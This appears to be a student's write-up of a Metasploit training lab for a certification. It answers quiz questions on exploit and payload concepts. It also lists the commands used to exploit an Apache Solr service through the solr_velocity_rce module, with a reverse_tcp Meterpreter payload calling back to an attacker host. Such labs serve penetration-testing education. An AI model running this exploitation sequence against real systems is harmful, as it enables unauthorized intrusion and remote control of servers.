# 🛡️ Metasploit Framework Lab — CAPT Certification

## 👨‍💻 Author
**Amanulla Shaik**  
CAPT Certification Candidate | Cybersecurity Enthusiast  

---

# 🧠 Module Overview
This lab focused on understanding and using the Metasploit Framework to exploit vulnerable services and perform post-exploitation enumeration. The objective was to gain hands-on experience with exploitation workflows used in real-world penetration testing.

---

# 🎯 Learning Objectives
- Understand Metasploit architecture  
- Learn exploit vs payload concepts  
- Perform service exploitation  
- Gain shell access to target system  
- Enumerate system information after exploitation  
- Identify sensitive files on compromised system  

---

# 🛠 Tools Used
- Metasploit Framework (msfconsole)  
- Nmap  
- Linux Terminal  
- HackerBox Lab Environment  

---

# 📌 Questions & Solutions

## 🔹 Q1. Program that exploits vulnerabilities to gain unauthorized access  
**Answer:** Exploit  

**Explanation:**  
An exploit is a program or code that takes advantage of a vulnerability in a system to gain unauthorized access or execute malicious actions.

---

## 🔹 Q2. Code executed after successful exploitation  
**Answer:** Payload  

**Explanation:**  
A payload runs on the target system after successful exploitation and provides control or performs malicious actions.

---

## 🔹 Q3. Modules for scanning and indirect attacks  
**Answer:** Auxiliary  

**Explanation:**  
Auxiliary modules perform scanning, enumeration, and denial-of-service attacks without providing shell access.

---

## 🔹 Q4. Advanced payload with post-exploitation features  
**Answer:** Meterpreter  

**Explanation:**  
Meterpreter provides interactive shell access and advanced post-exploitation capabilities such as file transfer and privilege escalation.

---

## 🔹 Q5. Shell that waits for attacker connection  
**Answer:** Bind  

**Explanation:**  
Bind shell opens a port on the target system and waits for attacker to connect.

---

## 🔹 Q6. Shell that connects back to attacker  
**Answer:** Reverse  

**Explanation:**  
Reverse shell connects from target system back to attacker machine.

---

## 🔹 Q7. Command to start Metasploit  
```bash
msfconsole

🔹 Q8. Tool used to generate payloads

Answer: msfvenom

🔹 Q9. Command to view active sessions
sessions
🔹 Q10. Alternative command for exploit
run
🔹 Q11. Meterpreter command to view system info
sysinfo
🔹 Q12. Command to access target shell
shell
💻 Practical Exploitation
🔹 Q13. Metasploit module for Apache Solr RCE
exploit/multi/http/solr_velocity_rce

Explanation:
This exploit targets vulnerable Apache Solr services and allows remote command execution on the system.

🔹 Q14. Active user obtained from shell

Answer: solr

Explanation:
After exploitation and enumeration, the active user running the vulnerable service was identified as solr.

🔹 Q15. Favorite book from /home/favorite_book.txt

Status: ⏳ Pending (Lab environment issue)

This will be updated once file content is retrieved successfully.

🛠 Commands Used in Lab
Service enumeration
nmap -p- -sV <target-ip>
Start metasploit
msfconsole
Search exploit
search solr
Use exploit
use exploit/multi/http/solr_velocity_rce
Configure exploit
set RHOSTS <target-ip>
set RPORT 8983
set TARGETURI /solr
set payload java/meterpreter/reverse_tcp
set LHOST <attacker-ip>
run
Session interaction
sessions
sessions -i 1
🧠 Skills Gained

Using Metasploit framework

Exploit searching & configuration

Payload handling

Post-exploitation enumeration

Real-world penetration testing workflow

🏁 Conclusion

This lab provided hands-on experience with the Metasploit Framework and demonstrated how vulnerabilities in network services can be exploited to gain system access. It strengthened practical penetration testing and enumeration skills required for cybersecurity roles.
